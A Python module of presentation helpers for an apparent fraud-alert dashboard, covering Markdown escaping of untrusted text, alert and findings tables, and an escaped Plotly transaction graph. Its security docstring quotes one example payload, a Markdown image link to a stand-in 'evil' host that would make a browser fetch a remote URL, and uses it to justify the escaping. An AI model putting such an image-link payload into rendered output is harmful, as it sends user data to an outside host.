"""Pure presentation helpers for the dashboard (no Streamlit imports, unit-tested).

Security:
    Transaction fields, account ids, analyst notes and SAR text are untrusted. The
    dashboard therefore shows them only through widgets that render plain text
    (``st.dataframe``, ``st.text_area``, ``st.code``) and never with
    ``unsafe_allow_html``. Strings that must pass through a Markdown-rendering widget
    (``st.error``, ``st.caption``) go through :func:`plain` first: an unescaped
    ``![x](https://evil/?q=...)`` would make the browser fetch a remote URL. Plotly
    renders a subset of HTML in labels, so graph labels are HTML-escaped.
"""

from __future__ import annotations

import html
import re
from collections.abc import Sequence
from typing import Any, Final

import networkx as nx
import pandas as pd
import plotly.graph_objects as go

MAX_GRAPH_EDGES: Final = 150
_MD_SPECIAL: Final = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$:])")
COLORS: Final = {"subject": "#c0392b", "pattern": "#e67e22", "other": "#7f8c8d"}


def plain(text: object, max_len: int = 300) -> str:
    """Make untrusted text safe for a Markdown-rendering widget.

    Args:
        text: Any value.
        max_len: Truncation length.

    Returns:
        Text with Markdown and HTML metacharacters backslash-escaped and newlines
        flattened.
    """
    flat = " ".join(str(text).split())[:max_len]
    return _MD_SPECIAL.sub(r"\\\1", flat)


def queue_table(items: Sequence[dict[str, Any]]) -> pd.DataFrame:
    """The ranked queue as a table.

    Args:
        items: ``AlertList.items``.

    Returns:
        One row per alert.
    """
    return pd.DataFrame(
        [
            {
                "rank": i["rank"],
                "case": i["case_id"],
                "time": i["timestamp"],
                "p_triage": round(float(i["p_triage"]), 4),
                "escalated": i["escalated"],
                "status": i["status"],
                "findings": i["n_findings"],
                "patterns": ", ".join(i["patterns"]),
            }
            for i in items
        ],
        columns=["rank", "case", "time", "p_triage", "escalated", "status", "findings", "patterns"],
    )


def findings_table(findings: Sequence[dict[str, Any]]) -> pd.DataFrame:
    """System 2 findings as a table.

    Args:
        findings: ``CaseDetail.findings``.

    Returns:
        One row per finding.
    """
    return pd.DataFrame(
        [
            {
                "pattern": f["kind"],
                "size": f["size"],
                "accounts": len(f["accounts"]),
                "payments": len(f["tx_ids"]),
                "total_usd": f["total_usd"],
                "from": f["first_date"],
                "to": f["last_date"],
            }
            for f in findings
        ],
        columns=["pattern", "size", "accounts", "payments", "total_usd", "from", "to"],
    )


def records_table(rows: Sequence[dict[str, Any]], columns: Sequence[str]) -> pd.DataFrame:
    """Generic table of API records restricted to ``columns``.

    Args:
        rows: Records.
        columns: Columns to keep, in order.

    Returns:
        The table.
    """
    return pd.DataFrame([{c: r.get(c) for c in columns} for r in rows], columns=list(columns))


def _layout(graph: nx.DiGraph[str], seed: int) -> dict[str, tuple[float, float]]:
    pos = nx.spring_layout(graph, seed=seed)
    return {str(n): (float(p[0]), float(p[1])) for n, p in pos.items()}


def case_graph(
    edges: Sequence[dict[str, Any]],
    subjects: Sequence[str],
    pattern_accounts: Sequence[str],
    *,
    max_edges: int = MAX_GRAPH_EDGES,
    seed: int = 42,
) -> go.Figure:
    """Interactive transaction graph of a case.

    The largest flows are drawn (plus every edge touching a subject account) so dense
    cases stay readable; the caption reports how many edges were hidden.

    Args:
        edges: ``CaseDetail.edges`` (aggregated per account pair).
        subjects: The alert's payer and payee.
        pattern_accounts: Accounts named in System 2 findings.
        max_edges: Drawing budget.
        seed: Layout seed (deterministic positions).

    Returns:
        A plotly figure.
    """
    subj = set(subjects)
    ranked = sorted(edges, key=lambda e: -float(e["total_usd"]))
    touches = [e["payer"] in subj or e["payee"] in subj for e in ranked]
    keep = [e for e, t in zip(ranked, touches, strict=True) if t]
    rest = [e for e, t in zip(ranked, touches, strict=True) if not t]
    keep += rest[: max(0, max_edges - len(keep))]
    graph: nx.DiGraph[str] = nx.DiGraph()
    graph.add_nodes_from(subj)
    for e in keep:
        graph.add_edge(str(e["payer"]), str(e["payee"]), count=e["count"], usd=e["total_usd"])
    pos = _layout(graph, seed)
    in_pattern = set(pattern_accounts)

    xs: list[float | None] = []
    ys: list[float | None] = []
    for a, b in graph.edges():
        xs += [pos[a][0], pos[b][0], None]
        ys += [pos[a][1], pos[b][1], None]
    edge_trace = go.Scatter(x=xs, y=ys, mode="lines", line={"width": 1, "color": "#bdc3c7"})

    nodes = list(graph.nodes())
    kind = ["subject" if n in subj else "pattern" if n in in_pattern else "other" for n in nodes]
    labels = [
        html.escape(f"{n} ({k}) in={graph.in_degree(n)} out={graph.out_degree(n)}")
        for n, k in zip(nodes, kind, strict=True)
    ]
    node_trace = go.Scatter(
        x=[pos[n][0] for n in nodes],
        y=[pos[n][1] for n in nodes],
        mode="markers",
        hovertext=labels,
        hoverinfo="text",
        marker={
            "size": [16 if k == "subject" else 10 for k in kind],
            "color": [COLORS[k] for k in kind],
        },
    )
    hidden = len(edges) - len(keep)
    title = f"{len(nodes)} accounts, {len(keep)} payment links"
    title += f" ({hidden} smaller links hidden)" if hidden > 0 else ""
    fig = go.Figure(data=[edge_trace, node_trace])
    fig.update_layout(
        title={"text": html.escape(title)},
        showlegend=False,
        xaxis={"visible": False},
        yaxis={"visible": False},
        margin={"l": 10, "r": 10, "t": 40, "b": 10},
        height=480,
    )
    return fig
